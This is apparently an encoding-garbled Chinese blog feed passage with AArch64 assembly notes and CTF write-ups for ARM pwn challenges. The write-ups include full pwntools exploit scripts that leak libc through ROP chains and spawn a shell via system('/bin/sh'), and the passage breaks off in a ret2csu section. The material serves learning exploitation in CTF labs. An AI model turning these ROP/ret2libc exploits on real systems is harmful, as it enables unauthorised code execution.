å¹³å°å¯„å­˜å™¨ï¼Œå®ƒçš„ä½¿ç”¨ä¸å¹³å°ç›¸å…³,é¿å…ä½¿ç”¨</li><li><strong>x19-x28ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºä½¿ç”¨æ—¶å¿…é¡»ä¿å­˜</strong></li><li><strong>x29 æ ˆå¸§å¯„å­˜å™¨fp(frame register)</strong></li><li><strong>x30 é“¾æ¥å¯„å­˜å™¨lr(link registerï¼‰ä¿å­˜è¿”å›åœ°å€</strong></li><li><strong>å †æ ˆæŒ‡é’ˆå¯„å­˜å™¨sp</strong></li><li><strong>æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨pc</strong>ï¼Œ<strong>aarch64çš„pcä¸èƒ½ç›´æ¥è¯»å†™äº†ï¼Œä½†æŸäº›æŒ‡ä»¤å¯ä»¥é—´æ¥ä½¿ç”¨ï¼Œå¦‚adrå’Œbrï¼ŒadræŒ‡ä»¤æ—¶pcå€¼æ˜¯æŒ‰å½“å‰æŒ‡ä»¤pcå€¼æ¥ç®—ï¼Œè€Œä¸æ˜¯å’Œarm32ä¸€æ ·çš„+4æˆ–+8</strong></li><li><strong>XZR(32ä½WZR)é›¶å¯„å­˜å™¨</strong></li></ul><h2 id="æŒ‡ä»¤åŠ©è®°ç¬¦"><a href="#æŒ‡ä»¤åŠ©è®°ç¬¦" class="headerlink" title="æŒ‡ä»¤åŠ©è®°ç¬¦"></a>æŒ‡ä»¤åŠ©è®°ç¬¦</h2><table><thead><tr><th>æ•´å‹</th><th></th></tr></thead><tbody><tr><td>W&#x2F;R</td><td>32bitæ•´æ•°</td></tr><tr><td>X</td><td>64bitæ•´æ•°</td></tr><tr><td>åŠ è½½&#x2F;å­˜å‚¨ã€ç¬¦å·-0æ‰©å±•</td><td></td></tr><tr><td>B</td><td>æ— ç¬¦å·8bitå­—èŠ‚</td></tr><tr><td>SB</td><td>å¸¦ç¬¦å·8bitå­—èŠ‚</td></tr><tr><td>H</td><td>æ— ç¬¦å·16bitåŠå­—</td></tr><tr><td>SH</td><td>å¸¦ç¬¦å·16bitåŠå­—</td></tr><tr><td>W</td><td>æ— ç¬¦å·32bitå­—</td></tr><tr><td>SW</td><td>å¸¦ç¬¦å·32bitå­—</td></tr><tr><td>P</td><td>Pairï¼ˆä¸€å¯¹ï¼‰</td></tr><tr><td>å¯„å­˜å™¨å®½åº¦æ”¹å˜</td><td></td></tr><tr><td>H</td><td>é«˜ä½ï¼ˆdst gets top halfï¼‰</td></tr><tr><td>N</td><td>æœ‰é™ä½ï¼ˆdst &lt; srcï¼‰</td></tr><tr><td>L</td><td>Long ï¼ˆdst &gt; srcï¼‰</td></tr><tr><td>W</td><td>Wide (dst&#x3D;&#x3D;src1,src1&gt;src2) ï¼Ÿ</td></tr></tbody></table><h2 id="å¸¸è§æŒ‡ä»¤"><a href="#å¸¸è§æŒ‡ä»¤" class="headerlink" title="å¸¸è§æŒ‡ä»¤"></a>å¸¸è§æŒ‡ä»¤</h2><p>æŒ‡ä»¤å®šé•¿32bitï¼Œidaé‡Œä¼šç”Ÿæˆä¸€äº›8å­—èŠ‚çš„ä¼ªä»£ç </p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p><strong>MOVK Rn, #imm, #shift</strong>:ç”¨äºå°†ä¸€ä¸ª 16 ä½ç«‹å³æ•°ç§»åŠ¨åˆ°æŒ‡å®šçš„å¯„å­˜å™¨,å·¦ç§»åç§»é‡shiftç”¨äºæŒ‡å®šå°†ç«‹å³æ•°æ”¾ç½®åœ¨å¯„å­˜å™¨ä¸­çš„ä½ç½®ï¼Œ<strong>å…¶ä½™ä½ä¿æŒä¸å˜</strong></p><p><strong>MOVZ Rn, #imm, #shif</strong>:ç±»ä¼¼äºmovkï¼Œ<strong>å…¶ä½™ä½ç½®é›¶</strong></p><h3 id="è®¿å­˜"><a href="#è®¿å­˜" class="headerlink" title="è®¿å­˜"></a>è®¿å­˜</h3><p><strong>adrl</strong>ï¼šå’Œadrä¸€æ ·ï¼Œæ˜¯ä¸­ç­‰èŒƒå›´çš„åœ°å€è¯»å–ä¼ªæŒ‡ä»¤</p><p><strong>ADRP Xd, symbol</strong>:(Address of Page) æŠŠsymbolå‘å·¦ç§»åŠ¨12ä½ ä½ä½è¡¥é›¶ï¼Œç§»åˆ°Xdå¯„å­˜å™¨ï¼Œæ‰€ä»¥å°±æ˜¯ä¸€ä¸ªpage4kå¯¹é½çš„ä½ç½®</p><ul><li>å¯»å€æ•°æ®æ—¶ç”±äºè¿˜æ˜¯å››å­—èŠ‚å®šé•¿æŒ‡ä»¤ï¼Œå¯ä»¥æ“ä½œç«‹å³æ•°å¤ªå°ï¼Œä¸€èˆ¬å°±addrp xdï¼ŒsybolsæŠŠé¡µè¾¹ç•Œåœ°å€è½½å…¥ï¼Œå†add xdï¼Œxdï¼Œoffsetï¼Œå†åŠ ä¸Šé¡µåç§»æ¥å¯»å€</li></ul><p><strong>strbï¼š</strong> (store register byte) å°†å¯„å­˜å™¨ä¸­çš„å€¼å†™å…¥åˆ°å†…å­˜ä¸­ï¼Œåªå­˜å‚¨ä¸€ä¸ªå­—èŠ‚</p><p><strong>ldrbï¼š</strong> (load register byte) å°†å†…å­˜ä¸­çš„å€¼ï¼ˆåªè¯»å–ä¸€ä¸ªå­—èŠ‚ï¼‰è¯»å–åˆ°å¯„å­˜å™¨ä¸­ï¼Œé«˜ä½æ¸…é›¶(æ— ç¬¦å·é›¶æ‹“å±•)</p><p><strong>ldrsb</strong>: (Load Register Signed Byte)åŠ è½½ä¸€ä¸ªæœ‰ç¬¦å·å­—èŠ‚,å°†æœ‰ä¸€ä¸ªå­—èŠ‚æŒ‰ç¬¦å·ä½æ‹“å±•åˆ°å¯„å­˜å™¨å­—é•¿</p><p><strong>ldrh</strong>ï¼šåŠ è½½åŠä¸ªå¯„å­˜å™¨å­—é•¿åˆ°å¯„å­˜å™¨ï¼Œé«˜ä½æ¸…é›¶</p><p><strong>strh</strong>:åŠå­—å­˜å‚¨</p><p><strong>swp</strong>ï¼šäº¤æ¢æŒ‡ä»¤SWP X0ï¼ŒX1ï¼Œ[X2] ;å°†memory(X2)æ•°æ®åŠ è½½åˆ°X0ï¼ŒåŒæ—¶å°†X1ä¸­çš„æ•°æ®å­˜å‚¨åˆ°memory(X2)</p><h3 id="æ ˆæ“ä½œ"><a href="#æ ˆæ“ä½œ" class="headerlink" title="æ ˆæ“ä½œ"></a>æ ˆæ“ä½œ</h3><p><strong>stpï¼š</strong> å…¥æ ˆæŒ‡ä»¤ï¼ˆ<code>str</code> çš„å˜ç§æŒ‡ä»¤ï¼Œå¯ä»¥åŒæ—¶æ“ä½œä¸¤ä¸ªå¯„å­˜å™¨ï¼‰</p><ul><li><code>STP x4, x5, [sp, #-0x20]ï¼</code>ï¼šå°†<code>sp+0x20</code>å¤„ä¾æ¬¡è¦†ç›–ä¸º<code>x4ï¼Œx5</code>ï¼Œå³<code>x4</code>å…¥æ ˆåˆ°<code>sp-0x20</code>ï¼Œ<code>x5</code>å…¥æ ˆåˆ°<code>sp-0x0x20+8</code>ï¼Œæœ€å<code>sp-=0x20</code></li></ul><p><strong>ldpï¼š</strong> å‡ºæ ˆæŒ‡ä»¤ï¼ˆ<code>ldr</code> çš„å˜ç§æŒ‡ä»¤ï¼Œå¯ä»¥åŒæ—¶æ“ä½œä¸¤ä¸ªå¯„å­˜å™¨ï¼‰</p><ul><li><code>LDP x29, x30, [sp], #0x40</code>ï¼šå°†<code>sp</code>å¼¹æ ˆåˆ°<code>x29</code>ï¼Œ<code>sp+0x8</code>å¼¹æ ˆåˆ°<code>x30</code>ï¼Œæœ€å<code>sp += 0x40</code></li></ul><h3 id="åˆ†æ”¯è·³è½¬"><a href="#åˆ†æ”¯è·³è½¬" class="headerlink" title="åˆ†æ”¯è·³è½¬"></a>åˆ†æ”¯è·³è½¬</h3><p><strong>blr Xm</strong>ï¼šè·³è½¬åˆ°ç”±Xmç›®æ ‡å¯„å­˜å™¨æŒ‡å®šçš„åœ°å€å¤„ï¼ŒåŒæ—¶å°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å­˜æ”¾åˆ°X30å¯„å­˜å™¨ä¸­</p><p><strong>br Xm</strong>ï¼šè·³è½¬åˆ°ç”±Xmç›®æ ‡å¯„å­˜å™¨æŒ‡å®šçš„åœ°å€å¤„</p><p>**ret {Xm}**ï¼šå­ç¨‹åºè¿”å›åˆ°ç”±Xmç›®æ ‡å¯„å­˜å™¨æŒ‡å®šçš„åœ°å€å¤„ï¼ŒXmä¸å†™é»˜è®¤æ˜¯X30</p><p><strong>cbz Xmï¼Œlabel</strong>ï¼šXmç»“æœä¸ºé›¶ï¼ˆZeroï¼‰åˆ™è·³è½¬label(åªèƒ½è·³åˆ°åé¢çš„æŒ‡ä»¤)compare and branch if zero</p><p><strong>cbnz</strong>ï¼šä¸ä¸º0æ—¶è·³è½¬,åªèƒ½è·³åˆ°åé¢çš„æŒ‡ä»¤</p><p><strong>svc #imm</strong>ï¼šè½¯ä¸­æ–­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               var_20= <span class="number">-0x20</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               x= <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000000754</span> FD <span class="number">7B</span> BE A9                   STP             X29, X30, [SP,#var_20]!</span><br><span class="line">.text:<span class="number">0000000000000758</span> FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">000000000000075</span>C <span class="number">00</span> CF <span class="number">8</span>A <span class="number">52</span> <span class="number">80</span> <span class="number">46</span> A2 <span class="number">72</span>       MOV             W0, #<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">0000000000000764</span> E0 <span class="number">1F</span> <span class="number">00</span> B9                   STR             W0, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000768</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">1</span>E <span class="number">91</span>       ADRL            X0, aHelloWorld         ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000770</span> B0 FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000770</span></span><br><span class="line">.text:<span class="number">0000000000000774</span> E1 <span class="number">1F</span> <span class="number">40</span> B9                   LDR             W1, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000778</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1F</span> <span class="number">91</span>       ADRL            X0, aX                  ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000780</span> AC FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000780</span></span><br><span class="line">.text:<span class="number">0000000000000784</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000000788</span> FD <span class="number">7B</span> C2 A8                   LDP             X29, X30, [SP],#<span class="number">0x20</span></span><br><span class="line">.text:<span class="number">000000000000078</span>C C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p>objdump</p><p><img src="/2023/07/19/aarch64-asm/image-20230720143324402.png" alt="image-20230720143324402"></p><p>fpå’Œspéƒ½æŒ‡å‘æ ˆé¡¶ï¼ŒåŸæ¥çš„bpå’Œè¿”å›åœ°å€å­˜åœ¨æ ˆé¡¶ï¼Œæ‰€ä»¥é€šè¿‡æ ˆæº¢å‡ºåŸºæœ¬ä¿®æ”¹ä¸åˆ°æœ¬å‡½æ•°çš„è¿”å›åœ°å€ï¼Œåªèƒ½ä¿®æ”¹æœ¬å‡½æ•°è°ƒç”¨è€…å‡½æ•°çš„bpå’Œè¿”å›åœ°å€</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.cnblogs.com/lvdongjie/p/6644821.html">https://www.cnblogs.com/lvdongjie/p/6644821.html</a></p><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢arm pwn</title>
      <link href="/2023/07/19/first-arm-pwn/"/>
      <url>/2023/07/19/first-arm-pwn/</url>
      
        <content type="html"><![CDATA[<p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ">https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ</a><br>æå–ç ï¼šs1hv</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>gdb-multiarchå’Œqemu-userè¿œç¨‹è°ƒè¯•</p><p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>pythonè„šæœ¬é‡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#è°ƒè¯•</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#ä¸è°ƒè¯•</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="2022å®‰æ´µæ¯-babyarm"><a href="#2022å®‰æ´µæ¯-babyarm" class="headerlink" title="2022å®‰æ´µæ¯_babyarm"></a>2022å®‰æ´µæ¯_babyarm</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ¢è¡¨çš„base64åŠ å¯†   <a href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a> ç›´æ¥ç½‘ç«™è§£å¯†ä¸€ä¸‹</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œå…ˆæ³„éœ²libc ret2libcå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./chall_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;target remote localhost:1234&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0010C30&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span></span><br><span class="line">passwd=<span class="string">b&#x27;s1mpl3Dec0d4r&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;msg&gt; &#x27;</span>,passwd)</span><br><span class="line">  sla(<span class="string">b&#x27;res&gt; &#x27;</span>,padding+payload)</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x1050C</span></span><br><span class="line">pop_r3_pc = <span class="number">0x10464</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x10cb0</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x10ca0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubuntu22 ~/s/d/2022å®‰æ´µæ¯_babyarm&gt; ROPgadget --binary ./chall --only pop                                                                                                                                     </span></span><br><span class="line"><span class="string">Gadgets information                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">============================================================                                                                                                                                                       </span></span><br><span class="line"><span class="string">0x00010658 : pop &#123;fp, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010464 : pop &#123;r3, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x000105f0 : pop &#123;r4, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010cb0 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;      </span></span><br><span class="line"><span class="string">0x00010ca0 : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x10c90 ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt&gt; &#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base = u32(io.recv()[:4])</span></span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>å’Œä¸Šä¸€ä¸ªé¢˜å‡ ä¹ä¸€æ¨¡ä¸€æ ·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./elec_system2_patch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-arm&quot;,&quot;-g&quot;, &quot;1234&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi/&quot;,&quot;./elec_system2_patch&quot;])</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;target remote localhost:1234&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000105c0 : pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">0x000103f0 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x00010558 : pop &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">0x0001070c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">0x000106fc : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x106ec ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr=<span class="number">0x10474</span></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f0</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x0001070c</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x000106fc</span></span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">ru(<span class="string">b&#x27;ivity.\n&#x27;</span>)</span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu-arm"><a href="#ret2csu-arm" class="headerlink" title="ret2csu_arm"></a>ret2csu_arm</h2><p>åŸºç¡€æ ˆæº¢å‡º,ä½†æ˜¯è¦æ§åˆ¶writeå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°æ¥æ³„éœ²libcçš„gadgetä¸å¥½æ‰¾ï¼Œé€šç”¨çš„æ¨¡æ¿å°±æ˜¯__libc_csu_init</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000104E0</span></span><br><span class="line">.text:<span class="number">000104E0</span>             loc_104E0                               ; CODE XREF: 